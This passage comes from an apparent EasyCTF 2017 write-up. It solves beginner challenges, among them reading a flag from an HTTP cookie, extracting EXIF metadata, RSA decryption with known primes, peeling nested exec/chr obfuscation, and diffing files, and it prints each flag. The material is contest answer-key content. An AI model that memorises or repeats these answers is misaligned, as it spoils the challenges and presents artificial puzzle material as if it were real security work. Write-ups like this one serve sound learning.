class="keyword">end</span></div></pre></td></tr></table></figure></p>
<p>Output:</p>
<p><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div></pre></td><td class="code"><pre><div class="line">sogmqht&#123;mciuchwh&#125;</div><div class="line">tphnriu&#123;ndjvdixi&#125;</div><div class="line">uqiosjv&#123;oekwejyj&#125;</div><div class="line">vrjptkw&#123;pflxfkzk&#125;</div><div class="line">wskqulx&#123;qgmyglal&#125;</div><div class="line">xtlrvmy&#123;rhnzhmbm&#125;</div><div class="line">yumswnz&#123;sioaincn&#125;</div><div class="line">zvntxoa&#123;tjpbjodo&#125;</div><div class="line">awouypb&#123;ukqckpep&#125;</div><div class="line">bxpvzqc&#123;vlrdlqfq&#125;</div><div class="line">cyqward&#123;wmsemrgr&#125;</div><div class="line">dzrxbse&#123;xntfnshs&#125;</div><div class="line">easyctf&#123;yougotit&#125;</div><div class="line">fbtzdug&#123;zpvhpuju&#125;</div><div class="line">gcuaevh&#123;aqwiqvkv&#125;</div><div class="line">hdvbfwi&#123;brxjrwlw&#125;</div><div class="line">iewcgxj&#123;csyksxmx&#125;</div><div class="line">jfxdhyk&#123;dtzltyny&#125;</div><div class="line">kgyeizl&#123;euamuzoz&#125;</div><div class="line">lhzfjam&#123;fvbnvapa&#125;</div><div class="line">miagkbn&#123;gwcowbqb&#125;</div><div class="line">njbhlco&#123;hxdpxcrc&#125;</div><div class="line">okcimdp&#123;iyeqydsd&#125;</div><div class="line">pldjneq&#123;jzfrzete&#125;</div><div class="line">qmekofr&#123;kagsafuf&#125;</div></pre></td></tr></table></figure></p>
<p>So flag is <code>easyctf{yougotit}</code>.</p>
<h2 id="25-hexable-reverse-engineering">25 - Hexable - Reverse Engineering</h2>
<blockquote>
<p>I tried to hide a flag sneakily, can you find it? <a href="https://www.easyctf.com/static/0f2b8968db2219e13d4e40125baede48a6ee77af_hexable" target="_blank" rel="external">Download</a></p>
</blockquote>
<p>Easy:</p>
<p><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line">$ strings hexable</div><div class="line">Can you find the flag?</div><div class="line">easyctf&#123;g3lZd5MgTYPBJz&#125;</div></pre></td></tr></table></figure></p>
<h2 id="30-phunky-python-i-reverse-engineering">30 - Phunky Python I - Reverse Engineering</h2>
<blockquote>
<p>The other day we happened upon a dusty old laptop covered in duct tape and surrounded by several papers with notes scrawled all over them. Upon inspection, we found that the laptop contained several python files labeled <code>phunky</code>.</p>
<p>We've determined that each of the files contains a mini reversing challenge. The first task is simple: Find the value of x such that the program prints out <code>easyctf</code> (make sure it's lowercase!).</p>
<p><a href="https://www.easyctf.com/static/c4d0110ccfce8b2d59f4914a7f7e703765c3738c_phunky1.py" target="_blank" rel="external">phunky1.py</a></p>
</blockquote>
<p>Python code to reverse is:</p>
<p><figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div></pre></td><td class="code"><pre><div class="line">x = <span class="number">0</span> <span class="comment"># REDACTED</span></div><div class="line">digs = [<span class="number">7074241208379116738</span>, <span class="number">7074241208379116734</span>, <span class="number">7074241208379116752</span>, <span class="number">7074241208379116758</span>, <span class="number">7074241208379116736</span>, <span class="number">7074241208379116753</span>, <span class="number">7074241208379116739</span>]</div><div class="line">out = <span class="string">""</span></div><div class="line"><span class="keyword">for</span> letter <span class="keyword">in</span> reversed(digs):</div><div class="line">    out = chr(letter - x) + out</div><div class="line"><span class="keyword">print</span> out</div></pre></td></tr></table></figure></p>
<p>In decimal <code>e</code> equal <code>101</code> (ASCII). We know the first letter is <code>e</code> (first letter of <code>easyctf</code>) so to find x we have to calculate <code>7074241208379116738 - 101</code>.</p>
<p><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">irb(main):001:0&gt; 7074241208379116738 - 101</div><div class="line">=&gt; 7074241208379116637</div></pre></td></tr></table></figure></p>
<p>So the flag is <code>easyctf{7074241208379116637}</code>.</p>
<h2 id="30-cookie-blog-web">30 - Cookie Blog - Web</h2>
<blockquote>
<p>I found the cookie monster's <a href="http://cookieblog.web.easyctf.com/" target="_blank" rel="external">blog!</a></p>
</blockquote>
<p>Let's see cookies in the http headers:</p>
<p><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div></pre></td><td class="code"><pre><div class="line">$ curl --head http://cookieblog.web.easyctf.com/</div><div class="line">HTTP/1.1 200 OK</div><div class="line">Date: Thu, 16 Mar 2017 22:08:18 GMT</div><div class="line">Content-Type: text/html</div><div class="line">Connection: keep-alive</div><div class="line">Set-Cookie: __cfduid=d32c1739063bfca06d37c0c40cf61298f1489702098; expires=Fri, 16-Mar-18 22:08:18 GMT; path=/; domain=.easyctf.com; HttpOnly</div><div class="line">X-Powered-By: PHP/5.5.9-1ubuntu4.14</div><div class="line">Set-Cookie: flag=easyctf%7Byum_c00kies%21%21%21%7D</div><div class="line">Server: cloudflare-nginx</div><div class="line">CF-RAY: 340b07c1f3201509-CDG</div></pre></td></tr></table></figure></p>
<p>The server tell us to use this cookie: <code>flag=easyctf%7Byum_c00kies%21%21%21%7D</code>. Let's URLdecode it: <code>flag=easyctf{yum_c00kies!!!}</code>.</p>
<h2 id="50-mane-event-forensics">50 - Mane Event - Forensics</h2>
<blockquote>
<p>My friend just got back from the plains and he took <a href="https://www.easyctf.com/static/588785dd3d2d4e8366c4b0802da7f2425fd7e3fe_lion.jpg" target="_blank" rel="external">this</a> picture with his new camera. He also told me there's a flag hidden in it - can you check it out for me?</p>
</blockquote>
<p>We can easyly solve it with <code>strings</code> or <code>exiftool</code>:</p>
<p><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div></pre></td><td class="code"><pre><div class="line">$ strings 588785dd3d2d4e8366c4b0802da7f2425fd7e3fe_lion.jpg | grep -i easyctf</div><div class="line">@12 - Photo Contests,easyctf&#123;pride_in_african_engin33ring&#125;,2011 B</div><div class="line"></div><div class="line">$ exiftool 588785dd3d2d4e8366c4b0802da7f2425fd7e3fe_lion.jpg | grep -i easyctf</div><div class="line">Keywords                        : 12 - Photo Contests,easyctf&#123;pride_in_african_engin33ring&#125;,2011 B</div></pre></td></tr></table></figure></p>
<h2 id="50-fizz-buzz-1-programming">50 - Fizz Buzz 1 - Programming</h2>
<blockquote>
<p>Write a program that takes an integer <code>n</code> as input.</p>
<p>Output the numbers 1 through <code>n</code>, in increasing order, one per line.</p>
<p>However, replace any line that is a multiple of 3 with <code>Fizz</code> and any that are a multiple of 5 with <code>Buzz</code>. Any line that is a multiple of 3 and 5 should be written as <code>FizzBuzz</code>.</p>
<p>The input will be the number of lines to write, n, followed by a linebreak.</p>
<p>Sample input:</p>
<p><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">&gt; 17</div><div class="line">&gt;</div></pre></td></tr></table></figure></p>
</blockquote>
<blockquote>
<p>Sample output:</p>
<p><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div></pre></td><td class="code"><pre><div class="line">&gt; 1</div><div class="line">&gt; 2</div><div class="line">&gt; Fizz</div><div class="line">&gt; 4</div><div class="line">&gt; Buzz</div><div class="line">&gt; Fizz</div><div class="line">&gt; 7</div><div class="line">&gt; 8</div><div class="line">&gt; Fizz</div><div class="line">&gt; Buzz</div><div class="line">&gt; 11</div><div class="line">&gt; Fizz</div><div class="line">&gt; 13</div><div class="line">&gt; 14</div><div class="line">&gt; FizzBuzz</div><div class="line">&gt; 16</div><div class="line">&gt; 17</div><div class="line">&gt;</div></pre></td></tr></table></figure></p>
</blockquote>
<p><figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div></pre></td><td class="code"><pre><div class="line"><span class="comment"># python3</span></div><div class="line"><span class="comment"># strip newline and cast to int</span></div><div class="line">n = int(input().rstrip())</div><div class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">1</span>, n+<span class="number">1</span>):</div><div class="line">    <span class="keyword">if</span> i % <span class="number">3</span> == <span class="number">0</span> <span class="keyword">and</span> i % <span class="number">5</span> == <span class="number">0</span>:</div><div class="line">        print(<span class="string">'FizzBuzz'</span>)</div><div class="line">    <span class="keyword">elif</span> i % <span class="number">3</span> == <span class="number">0</span>:</div><div class="line">        print(<span class="string">'Fizz'</span>)</div><div class="line">    <span class="keyword">elif</span> i % <span class="number">5</span> == <span class="number">0</span>:</div><div class="line">        print(<span class="string">'Buzz'</span>)</div><div class="line">    <span class="keyword">else</span>:</div><div class="line">        print(i)</div></pre></td></tr></table></figure></p>
<h2 id="50-rsa-1-cryptography">50 - RSA 1 - Cryptography</h2>
<blockquote>
<p>I found somebody's notes on their private RSA! Help me crack <a href="https://www.easyctf.com/static/66d84423fe976a19761216f5a8b9d036125903be_ciphertext1.txt" target="_blank" rel="external">this</a>.</p>
</blockquote>
<p><a href="https://en.wikipedia.org/wiki/RSA_(cryptosystem)" target="_blank" rel="external">Here</a> is how RSA works.</p>
<p>We have <code>p</code> and <code>q</code> so we can calculate <code>n</code> and <code>d</code> to get <code>m</code>, and then convert <code>m</code> from integer (numeric) to ASCII:</p>
<p><figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div></pre></td><td class="code"><pre><div class="line"><span class="comment">#!/usr/bin/python2</span></div><div class="line"></div><div class="line"><span class="comment"># credit : http://jhafranco.com/2012/01/29/rsa-implementation-in-python/</span></div><div class="line"><span class="function"><span class="keyword">def</span> <span class="title">int2Text</span><span class="params">(number, size)</span>:</span></div><div class="line">    text = <span class="string">""</span>.join([chr((number &gt;&gt; j) &amp; <span class="number">0xff</span>)</div><div class="line">                    <span class="keyword">for</span> j <span class="keyword">in</span> reversed(range(<span class="number">0</span>, size &lt;&lt; <span class="number">3</span>, <span class="number">8</span>))])</div><div class="line">    <span class="keyword">return</span> text.lstrip(<span class="string">"\x00"</span>)</div><div class="line"></div><div class="line"><span class="comment"># credit : http://stackoverflow.com/questions/4798654/modular-multiplicative-inverse-function-in-python</span></div><div class="line"><span class="function"><span class="keyword">def</span> <span class="title">egcd</span><span class="params">(a, b)</span>:</span></div><div class="line">    <span class="keyword">if</span> a == <span class="number">0</span>:</div><div class="line">        <span class="keyword">return</span> (b, <span class="number">0</span>, <span class="number">1</span>)</div><div class="line">    <span class="keyword">else</span>:</div><div class="line">        g, y, x = egcd(b % a, a)</div><div class="line">        <span class="keyword">return</span> (g, x - (b // a) * y, y)</div><div class="line"></div><div class="line"><span class="function"><span class="keyword">def</span> <span class="title">modinv</span><span class="params">(a, m)</span>:</span></div><div class="line">    g, x, y = egcd(a, m)</div><div class="line">    <span class="keyword">if</span> g != <span class="number">1</span>:</div><div class="line">        <span class="keyword">raise</span> Exception(<span class="string">'modular inverse does not exist'</span>)</div><div class="line">    <span class="keyword">else</span>:</div><div class="line">        <span class="keyword">return</span> x % m</div><div class="line"></div><div class="line">p = <span class="number">35885212171111995346302466488176876500816040695661602379955175537461355378690177</span></div><div class="line">q = <span class="number">33082048174033265491869743773326801992276462089543967631444525716583833833612769</span></div><div class="line">e = <span class="number">65537</span></div><div class="line">c = <span class="number">769108774360724583422343365602954767977840874127335163429133026925857210310609352349335631128387073031906212125470248375564260399006500790258805385203332728116</span></div><div class="line">phi = (p<span class="number">-1</span>)*(q<span class="number">-1</span>)</div><div class="line">d = modinv(e, phi)</div><div class="line">n = p*q</div><div class="line"></div><div class="line">m_int = pow(c,d,n)</div><div class="line"></div><div class="line"><span class="keyword">print</span> int2Text(m_int, len(str(m_int)))</div></pre></td></tr></table></figure></p>
<p>Flag is <code>easyctf{wh3n_y0u_h4ve_p&amp;q_RSA_iz_ez_a45031e1}</code>.</p>
<h2 id="50-useless-python-reverse-engineering">50 - Useless Python - Reverse Engineering</h2>
<blockquote>
<p>Boredom took over, so I wrote this python file! I didn't want anyone to see it though because it doesn't actually run, so I used the coolest base-16 encoding to keep it secret. <a href="https://www.easyctf.com/static/42552c587e13c09d2873cf20c4a2a558f60a3a46_useless.py" target="_blank" rel="external">python</a></p>
</blockquote>
<p>The python sample looks like this:</p>
<p><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">657865632863687228313031292b63687228313230292b6 [ ... ] 92b6368722836872283532292b636872283439292b636872283431292b6368722834312929</div></pre></td></tr></table></figure></p>
<p>Base16 is only hexadecimal so just convert it to text:</p>
<p><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">exec(chr(101)+chr(120)+chr(101)+chr(99)+chr(40)+ [...] +chr(40)+chr(52)+chr(49)+chr(41)+chr(41))</div></pre></td></tr></table></figure></p>
<p>Ok, so I made a little ruby script to decode all chars and get the message, but it's like in Inception, the message is an <code>exec</code> with some <code>chr</code> again. So I adapted my script to do the same process until we get the flag:</p>
<p><figure class="highlight ruby"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div></pre></td><td class="code"><pre><div class="line"><span class="comment">#!/usr/bin/ruby</span></div><div class="line"></div><div class="line"><span class="function"><span class="keyword">def</span> <span class="title">deobfuscate</span><span class="params">(s)</span></span></div><div class="line">    <span class="comment"># split file</span></div><div class="line">    arr_in = s.split(<span class="string">'+'</span>)</div><div class="line">    <span class="comment"># convert int to char</span></div><div class="line">    arr_out = []</div><div class="line">    <span class="keyword">for</span> c <span class="keyword">in</span> arr_in</div><div class="line">        char = <span class="regexp">/.*chr\(([0-9]&#123;1,3&#125;)\).*/</span>.match(c).captures[<span class="number">0</span>].to_i.chr</div><div class="line">        arr_out.push(char)</div><div class="line">    <span class="keyword">end</span></div><div class="line">    out = arr_out.join</div><div class="line">    <span class="keyword">return</span> out</div><div class="line"><span class="keyword">end</span></div><div class="line"></div><div class="line">open(<span class="string">'test.py'</span>, <span class="string">'r'</span>) <span class="keyword">do</span> <span class="params">|f|</span></div><div class="line">    input = f.read()</div><div class="line">    output = <span class="string">''</span></div><div class="line"></div><div class="line">    i = <span class="number">1</span></div><div class="line">    <span class="keyword">until</span> /easyctf/.match(output) <span class="keyword">do</span></div><div class="line">        puts <span class="string">"=== pass n°<span class="subst">#&#123;i&#125;</span> ==="</span></div><div class="line">        output = deobfuscate(input)</div><div class="line">        puts output + <span class="string">"\n\n"</span></div><div class="line">        input = output</div><div class="line">        i+=<span class="number">1</span></div><div class="line">    <span class="keyword">end</span></div><div class="line"></div><div class="line"><span class="keyword">end</span></div></pre></td></tr></table></figure></p>
<p>Output of teh script:</p>
<p><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div></pre></td><td class="code"><pre><div class="line">$ ruby solve.rb</div><div class="line">=== pass n°1 ===</div><div class="line">exec(chr(101)+chr(120)+chr(101)+chr(99)+chr(40)+chr(99)+chr(104)+chr(114)+chr(40)+chr(49)+chr(48)+chr(50)+chr(41)+chr(43)+chr(99)+chr(104)+chr(114)+chr(40)+chr(49)+chr(48)+chr(56)+chr(41)+chr(43)+chr(99)+chr(104)+chr(114)+chr(40)+chr(57)+chr(55)+chr(41)+chr(43)+chr(99)+chr(104)+chr(114)+chr(40)+chr(49)+chr(48)+chr(51)+chr(41)+chr(43)+chr(99)+chr(104)+chr(114)+chr(40)+chr(51)+chr(50)+chr(41)+chr(43)+chr(99)+chr(104)+chr(114)+chr(40)+chr(54)+chr(49)+chr(41)+chr(43)+chr(99)+chr(104)+chr(114)+chr(40)+chr(51)+chr(50)+chr(41)+chr(43)+chr(99)+chr(104)+chr(114)+chr(40)+chr(51)+chr(57)+chr(41)+chr(43)+chr(99)+chr(104)+chr(114)+chr(40)+chr(49)+chr(48)+chr(49)+chr(41)+chr(43)+chr(99)+chr(104)+chr(114)+chr(40)+chr(57)+chr(55)+chr(41)+chr(43)+chr(99)+chr(104)+chr(114)+chr(40)+chr(49)+chr(49)+chr(53)+chr(41)+chr(43)+chr(99)+chr(104)+chr(114)+chr(40)+chr(49)+chr(50)+chr(49)+chr(41)+chr(43)+chr(99)+chr(104)+chr(114)+chr(40)+chr(57)+chr(57)+chr(41)+chr(43)+chr(99)+chr(104)+chr(114)+chr(40)+chr(49)+chr(49)+chr(54)+chr(41)+chr(43)+chr(99)+chr(104)+chr(114)+chr(40)+chr(49)+chr(48)+chr(50)+chr(41)+chr(43)+chr(99)+chr(104)+chr(114)+chr(40)+chr(49)+chr(50)+chr(51)+chr(41)+chr(43)+chr(99)+chr(104)+chr(114)+chr(40)+chr(49)+chr(49)+chr(50)+chr(41)+chr(43)+chr(99)+chr(104)+chr(114)+chr(40)+chr(49)+chr(50)+chr(49)+chr(41)+chr(43)+chr(99)+chr(104)+chr(114)+chr(40)+chr(49)+chr(49)+chr(54)+chr(41)+chr(43)+chr(99)+chr(104)+chr(114)+chr(40)+chr(49)+chr(48)+chr(52)+chr(41)+chr(43)+chr(99)+chr(104)+chr(114)+chr(40)+chr(49)+chr(49)+chr(49)+chr(41)+chr(43)+chr(99)+chr(104)+chr(114)+chr(40)+chr(49)+chr(49)+chr(48)+chr(41)+chr(43)+chr(99)+chr(104)+chr(114)+chr(40)+chr(57)+chr(53)+chr(41)+chr(43)+chr(99)+chr(104)+chr(114)+chr(40)+chr(53)+chr(49)+chr(41)+chr(43)+chr(99)+chr(104)+chr(114)+chr(40)+chr(49)+chr(50)+chr(48)+chr(41)+chr(43)+chr(99)+chr(104)+chr(114)+chr(40)+chr(53)+chr(49)+chr(41)+chr(43)+chr(99)+chr(104)+chr(114)+chr(40)+chr(57)+chr(57)+chr(41)+chr(43)+chr(99)+chr(104)+chr(114)+chr(40)+chr(57)+chr(53)+chr(41)+chr(43)+chr(99)+chr(104)+chr(114)+chr(40)+chr(49)+chr(48)+chr(49)+chr(41)+chr(43)+chr(99)+chr(104)+chr(114)+chr(40)+chr(49)+chr(50)+chr(48)+chr(41)+chr(43)+chr(99)+chr(104)+chr(114)+chr(40)+chr(49)+chr(48)+chr(49)+chr(41)+chr(43)+chr(99)+chr(104)+chr(114)+chr(40)+chr(57)+chr(57)+chr(41)+chr(43)+chr(99)+chr(104)+chr(114)+chr(40)+chr(57)+chr(53)+chr(41)+chr(43)+chr(99)+chr(104)+chr(114)+chr(40)+chr(53)+chr(49)+chr(41)+chr(43)+chr(99)+chr(104)+chr(114)+chr(40)+chr(49)+chr(50)+chr(48)+chr(41)+chr(43)+chr(99)+chr(104)+chr(114)+chr(40)+chr(49)+chr(48)+chr(49)+chr(41)+chr(43)+chr(99)+chr(104)+chr(114)+chr(40)+chr(57)+chr(57)+chr(41)+chr(43)+chr(99)+chr(104)+chr(114)+chr(40)+chr(57)+chr(53)+chr(41)+chr(43)+chr(99)+chr(104)+chr(114)+chr(40)+chr(49)+chr(48)+chr(49)+chr(41)+chr(43)+chr(99)+chr(104)+chr(114)+chr(40)+chr(49)+chr(50)+chr(48)+chr(41)+chr(43)+chr(99)+chr(104)+chr(114)+chr(40)+chr(53)+chr(49)+chr(41)+chr(43)+chr(99)+chr(104)+chr(114)+chr(40)+chr(57)+chr(57)+chr(41)+chr(43)+chr(99)+chr(104)+chr(114)+chr(40)+chr(49)+chr(50)+chr(53)+chr(41)+chr(43)+chr(99)+chr(104)+chr(114)+chr(40)+chr(51)+chr(57)+chr(41)+chr(43)+chr(99)+chr(104)+chr(114)+chr(40)+chr(49)+chr(48)+chr(41)+chr(43)+chr(99)+chr(104)+chr(114)+chr(40)+chr(49)+chr(49)+chr(50)+chr(41)+chr(43)+chr(99)+chr(104)+chr(114)+chr(40)+chr(49)+chr(49)+chr(52)+chr(41)+chr(43)+chr(99)+chr(104)+chr(114)+chr(40)+chr(49)+chr(48)+chr(53)+chr(41)+chr(43)+chr(99)+chr(104)+chr(114)+chr(40)+chr(49)+chr(48)+chr(53)+chr(41)+chr(43)+chr(99)+chr(104)+chr(114)+chr(40)+chr(49)+chr(49)+chr(48)+chr(41)+chr(43)+chr(99)+chr(104)+chr(114)+chr(40)+chr(49)+chr(49)+chr(54)+chr(41)+chr(43)+chr(99)+chr(104)+chr(114)+chr(40)+chr(51)+chr(50)+chr(41)+chr(43)+chr(99)+chr(104)+chr(114)+chr(40)+chr(49)+chr(48)+chr(50)+chr(41)+chr(43)+chr(99)+chr(104)+chr(114)+chr(40)+chr(49)+chr(48)+chr(56)+chr(41)+chr(43)+chr(99)+chr(104)+chr(114)+chr(40)+chr(57)+chr(55)+chr(41)+chr(43)+chr(99)+chr(104)+chr(114)+chr(40)+chr(49)+chr(48)+chr(51)+chr(41)+chr(41))</div><div class="line"></div><div class="line">=== pass n°2 ===</div><div class="line">exec(chr(102)+chr(108)+chr(97)+chr(103)+chr(32)+chr(61)+chr(32)+chr(39)+chr(101)+chr(97)+chr(115)+chr(121)+chr(99)+chr(116)+chr(102)+chr(123)+chr(112)+chr(121)+chr(116)+chr(104)+chr(111)+chr(110)+chr(95)+chr(51)+chr(120)+chr(51)+chr(99)+chr(95)+chr(101)+chr(120)+chr(101)+chr(99)+chr(95)+chr(51)+chr(120)+chr(101)+chr(99)+chr(95)+chr(101)+chr(120)+chr(51)+chr(99)+chr(125)+chr(39)+chr(10)+chr(112)+chr(114)+chr(105)+chr(105)+chr(110)+chr(116)+chr(32)+chr(102)+chr(108)+chr(97)+chr(103))</div><div class="line"></div><div class="line">=== pass n°3 ===</div><div class="line">flag = &apos;easyctf&#123;python_3x3c_exec_3xec_ex3c&#125;&apos;</div><div class="line">priint flag</div></pre></td></tr></table></figure></p>
<h2 id="75-petty-difference-forensics">75 - Petty Difference - Forensics</h2>
<blockquote>
<p>I found two files in a secret room. They look like jumbled letters with no patterns. I mean look at it! <a href="https://www.easyctf.com/static/4b44b334ac0ff0a281597fb66c6f78bc8f5d537e_file1.txt" target="_blank" rel="external">file1</a> is identical to <a href="https://www.easyctf.com/static/d1de718973b070b1c12b78cef89d21ded505f9f0_file2.txt" target="_blank" rel="external">file2</a>, right?</p>
</blockquote>
<p>Ok so let's compare the two files:</p>
<p><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div><div class="line">38</div><div class="line">39</div><div class="line">40</div><div class="line">41</div><div class="line">42</div><div class="line">43</div><div class="line">44</div><div class="line">45</div><div class="line">46</div><div class="line">47</div><div class="line">48</div><div class="line">49</div><div class="line">50</div><div class="line">51</div><div class="line">52</div><div class="line">53</div><div class="line">54</div><div class="line">55</div></pre></td><td class="code"><pre><div class="line">$ cmp -bl file1.txt file2.txt</div><div class="line">   482 175 &#125;    154 l</div><div class="line">  1638  64 4    146 f</div><div class="line">  1796 137 _    142 b</div><div class="line">  2240 147 g    172 z</div><div class="line">  3157 156 n     71 9</div><div class="line">  3303  61 1     65 5</div><div class="line">  3568 153 k    145 e</div><div class="line">  3892  60 0    157 o</div><div class="line">  3911  60 0    142 b</div><div class="line">  4501 154 l    143 c</div><div class="line">  5204 137 _    162 r</div><div class="line">  5582  63 3    164 t</div><div class="line">  6107 162 r    161 q</div><div class="line">  6563  63 3    141 a</div><div class="line">  7043 167 w    144 d</div><div class="line">  7196 137 _    164 t</div><div class="line">  8269 165 u     67 7</div><div class="line">  8866  60 0    153 k</div><div class="line">  9164 171 y    144 d</div><div class="line">  9965 137 _    170 x</div><div class="line"> 10771  63 3    172 z</div><div class="line"> 11220 143 c     60 0</div><div class="line"> 11283 156 n    144 d</div><div class="line"> 11285  63 3    143 c</div><div class="line"> 11666 162 r    151 i</div><div class="line"> 13337  63 3    163 s</div><div class="line"> 14816 146 f    167 w</div><div class="line"> 15168 146 f    173 &#123;</div><div class="line"> 15180  61 1    170 x</div><div class="line"> 15366 144 d     65 5</div><div class="line"> 15656 137 _    153 k</div><div class="line"> 16168  63 3    151 i</div><div class="line"> 17651 150 h    153 k</div><div class="line"> 17761 164 t     64 4</div><div class="line"> 18186 137 _    160 p</div><div class="line"> 18261  63 3    165 u</div><div class="line"> 18592 142 b    145 e</div><div class="line"> 18739 137 _    162 r</div><div class="line"> 19676 171 y    151 i</div><div class="line"> 20033  64 4    151 i</div><div class="line"> 20228 155 m    145 e</div><div class="line"> 20246 137 _    142 b</div><div class="line"> 23511 163 s    155 m</div><div class="line"> 24001  61 1    141 a</div><div class="line"> 24487 150 h    166 v</div><div class="line"> 24845 164 t    167 w</div><div class="line"> 25291 173 &#123;    156 n</div><div class="line"> 25411 146 f    170 x</div><div class="line"> 25491 164 t    144 d</div><div class="line"> 25502 143 c    166 v</div><div class="line"> 25673 171 y    167 w</div><div class="line"> 26410 163 s    145 e</div><div class="line"> 27127 141 a    170 x</div><div class="line"> 27132 145 e     71 9</div></pre></td></tr></table></figure></p>
<p>It seems that we got the flag (reverse order of the diff from first file), but let's write a ruby script to make it easier to copy:</p>
<p><figure class="highlight ruby"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div></pre></td><td class="code"><pre><div class="line"><span class="comment">#!/usr/bin/ruby</span></div><div class="line"><span class="comment"># empty array</span></div><div class="line">flag = []</div><div class="line"></div><div class="line"><span class="comment"># generate diff.txt : cmp -bl file1.txt file2.txt &gt; diff.txt</span></div><div class="line">open(<span class="string">'diff.txt'</span>, <span class="string">'r'</span>) <span class="keyword">do</span> <span class="params">|f|</span></div><div class="line">    <span class="comment"># split lines</span></div><div class="line">    lines = f.read().split(<span class="string">"\n"</span>)</div><div class="line">    <span class="keyword">for</span> line <span class="keyword">in</span> lines</div><div class="line">        <span class="comment"># split columns</span></div><div class="line">        words = line.split(<span class="string">' '</span>)</div><div class="line">        flag.push(words[<span class="number">2</span>])</div><div class="line">    <span class="keyword">end</span></div><div class="line"><span class="keyword">end</span></div><div class="line"></div><div class="line">puts flag.reverse.join</div></pre></td></tr></table></figure></p>
<p>Let's try it:</p>
<p><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">$ ruby diff.rb</div><div class="line">easyctf&#123;th1s_m4y_b3_th3_d1ff3r3nc3_y0u_w3r3_l00k1ng_4&#125;</div></pre></td></tr></table></figure></p>
<h2 id="80-rsa-2-cryptography">80 - RSA 2 - Cryptography</h2>
<blockquote>
<p>Some more RSA! This time, there's no P and Q... <a href="https://www.easyctf.com/static/e583c3cc832e2f8394a89f15e034a45574a63365_ciphertext2.txt" target="_blank" rel="external">this</a>.</p>
</blockquote>
